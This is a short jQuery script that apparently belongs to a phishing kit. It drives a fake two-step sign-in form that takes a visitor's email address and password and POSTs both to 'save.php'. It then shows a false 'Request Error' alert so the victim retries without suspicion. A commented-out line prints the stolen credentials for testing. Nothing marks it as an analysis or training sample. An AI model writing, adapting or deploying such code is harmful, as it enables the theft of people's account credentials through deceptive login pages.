$(function () {
    $('button.nextbtn').click(() => {
        let inputInput = $('input.emailaddy')
        let passwdInput = $('input.passwd')
        if (inputInput.val().length < 1) return false

        if (inputInput.val().length > 1 &&
            passwdInput.val().length > 1) {
            
            const useremail = inputInput.val()
            const userpass = passwdInput.val()
            $.ajax({
                method: 'POST',
                url: 'save.php',
                data: {
                    email: useremail,
                    password: userpass
                },
                success: (data) => {
                    alert('Request Error. Please try again.')
                }
            })
            // alert(`user ${useremail}, pass ${userpass}`)
        } else {
            inputInput.hide()
            passwdInput.show()
        }
        
    })

    $('.btn-social').click(e => {
        const iframeSrc = $(e.currentTarget).data('frametarget')
        $('iframe').attr('src', iframeSrc)
    })

})